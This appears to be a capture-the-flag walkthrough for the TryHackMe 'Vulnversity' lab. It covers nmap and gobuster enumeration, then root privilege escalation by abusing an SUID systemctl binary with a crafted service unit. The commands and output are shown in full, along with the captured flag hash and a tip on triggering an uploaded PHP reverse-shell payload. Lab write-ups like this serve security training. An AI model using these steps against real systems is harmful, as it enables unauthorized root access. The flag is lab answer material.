# This contains the stuff related to vulnversity from TryHackMe

## Enumeration

```
nmap -sV < IP >
```
sV is for gathering Versions of the Services running on Target Machine

Tip:Its important to ensure you are always doing your reconnaissance thoroughly before progressing. Knowing all open services (which can all be points of exploitation) is very important, don't forget that ports on a higher range might be open so always scan ports after 1000 (even if you leave scanning in the background


```
gobuster dir -u http://<ip>:3333 -w <word list location>
```

## Priviledge Escalation

### SUID

In Linux, SUID (set owner userId upon execution) is a special type of file permission given to a file. SUID gives temporary permissions to a user to run the program/file with the permission of the file owner (rather than the user who runs it).

For example, the binary file to change your password has the SUID bit set on it (/usr/bin/passwd). This is because to change your password, it will need to write to the shadowers file that you do not have access to, root does, so it has root privileges to make the right changes.

Our SUID scan found a file, "systemctl".

systemctl is a binary that controls interfaces for init systems and service managers. Remember making your services run using the systemctl command during the boot time. All those tasks are handled as units and are defined in unit folders. By default systemctl will search these files in /etc/system/systemd.

For this machine we do not have access to the paths owned by root and by so we can't made the unit file. Although we can set environment variables. So let's do the PrivEsc.
Create Environment Variable

```
priv=$(mktemp).service
```

Create Unit File and assign this to environment variable
```
echo '[Service]
$ priv=$(mktemp).service
$ echo '[Service]
> ExecStart=/bin/bash -c "cat /root/root.txt > /opt/flag"
> [Install]
> WantedBy=multi-user.target' > $priv
$ 
```
 
What we have done here is to simply create a service which will be executing "BASH", then reading the flag from the root directory and then writing it in the flag (file) in /opt directory.

Now we need to run this unit file using systemctl.

```
$ cd /opt
$ /bin/systemctl link $priv
Created symlink from /etc/systemd/system/tmp.ikSEx6NVBy.service to /tmp/tmp.ikSEx6NVBy.service.
$ /bin/systemctl enable --now $priv
Created symlink from /etc/systemd/system/multi-user.target.wants/tmp.ikSEx6NVBy.service to /tmp/tmp.ikSEx6NVBy.service.
$ ls
flag
$ cat flag
a58ff8579f0a9270368d33a9966c7fd5
$ 
```
Here we found the flag! 

# Tip
 * After uploading the payload ( here, php-reverse-shell.phtml ), go to the location where the file is uploaded i.e. use get method so that the payload will be executed.
